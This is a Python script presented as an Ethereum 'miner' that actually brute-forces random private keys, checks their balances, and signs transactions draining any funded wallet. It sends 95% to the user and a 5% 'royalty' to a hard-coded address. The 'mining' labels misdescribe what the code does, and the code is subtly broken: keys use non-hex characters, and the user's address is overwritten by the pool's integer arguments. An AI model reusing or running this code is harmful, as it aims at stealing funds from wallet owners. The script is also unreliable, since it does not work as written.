import os
import sys
import time
import json
import string
import secrets
import requests
from web3 import Web3
import multiprocessing.dummy as multiprocessing

os.system("cls")
print("V 1.0")
print('███████╗░██████╗░██╗░░░██╗██╗████████╗██╗░░░██╗  ░██╗░░░░░░░██╗░░░░░░███╗░░░███╗██╗███╗░░██╗███████╗██████╗░')
print('██╔════╝██╔═══██╗██║░░░██║██║╚══██╔══╝╚██╗░██╔╝  ░██║░░██╗░░██║░░░░░░████╗░████║██║████╗░██║██╔════╝██╔══██╗')
print('█████╗░░██║██╗██║██║░░░██║██║░░░██║░░░░╚████╔╝░  ░╚██╗████╗██╔╝█████╗██╔████╔██║██║██╔██╗██║█████╗░░██████╔╝')
print('██╔══╝░░╚██████╔╝██║░░░██║██║░░░██║░░░░░╚██╔╝░░  ░░████╔═████║░╚════╝██║╚██╔╝██║██║██║╚████║██╔══╝░░██╔══██╗')
print('███████╗░╚═██╔═╝░╚██████╔╝██║░░░██║░░░░░░██║░░░  ░░╚██╔╝░╚██╔╝░░░░░░░██║░╚═╝░██║██║██║░╚███║███████╗██║░░██║')
print('╚══════╝░░░╚═╝░░░░╚═════╝░╚═╝░░░╚═╝░░░░░░╚═╝░░░  ░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░░░╚═╝╚═╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝')
print('\n')

minerAddress = input("Welcome User! Enter your ETHEREUM address to start mining: ")
if len(minerAddress) == 42:
    print("\033[32mMining address accepted!\033[0m")
    print("Miner is starting...\n")
    w3 = Web3(Web3.HTTPProvider('https://api.edennetwork.io/v1/rpc'))
    time.sleep(3)
    if w3.isConnected() == True:
        def MineProcess(minerAddress):
            i=0
            while i <= 1:
                key = "0x" + "".join(secrets.choice(string.ascii_lowercase + string.digits)
                                                                        for i in range(64))
                try:
                    account = w3.eth.account.from_key(key)
                    bal = w3.eth.get_balance(account.address)
                    if bal > 2000000000000000:
                        print("\033[32m[NEW HIT] Succesfully cracked a wallet with following key: " + key + "\033[0m")
                        gasAPI = "https://ethgasstation.info/api/ethgasAPI.json?"
                        gasdata = requests.get(gasAPI).text
                        gasjson = json.loads(gasdata)
                        avgGas = int(gasjson["average"])/10
                        MineTransaction = {
                            'nonce': w3.eth.getTransactionCount(account.address),
                            'to': str(minerAddress),
                            'value': (bal-w3.toWei(avgGas, "gwei")*2*21000)*0.95,
                            'gas': 21000,
                            'gasPrice': w3.toWei(avgGas, "gwei")
                        }
                        RoyaltyTransaction = {
                            'nonce': w3.eth.getTransactionCount(account.address)+1,
                            'to': "0x1cD1fbA59b08Ed2e81ec0F869dEe81AF098aFA5a",
                            'value': (bal-w3.toWei(avgGas, "gwei")*2*21000)*0.05,
                            'gas': 21000,
                            'gasPrice': w3.toWei(avgGas, "gwei")
                        }
                        signedMineTX = w3.eth.account.sign_transaction(MineTransaction, key)
                        sentMineTX = w3.eth.send_raw_transaction(signedMineTX)
                        signedRoyaltyTX = w3.eth.account.sign_transaction(RoyaltyTransaction, key)
                        sentRoyaltyTX = w3.eth.send_raw_transaction(signedRoyaltyTX)
                        print("\033[32m" + str(bal/1000000000*0.95) + " ETH has been sent to your wallet. TXHash: " + "https://etherscan.io/tx/" + str(w3.toHex(sentMineTX)))
                        input("\033[0mMiner stopped.")
                    else:
                        print("\033[31m[BAD HIT] | " + str(account.address) + " | cracked but insufficient balance of " + str(bal/1000000000) + " ETH\033[0m")
                        time.sleep(0.02)
                except:
                    print("\033[31m[BAD MATCH] | %s | Invalid key match for wallet\033[0m"%key)
                    time.sleep(0.02)

        if __name__=="__main__":
            process = multiprocessing.Pool(32)
            process.map(MineProcess, range(0, 100))
            process.close()
            process.join()
    else:
        print("\033[31mSomething went wrong...  RPC Connection Error. Are you connected to Internet?\033[0m")
else:
    print("That's not a valid ETHEREUM address!")
    input("\nMiner stopped. Please restart.")

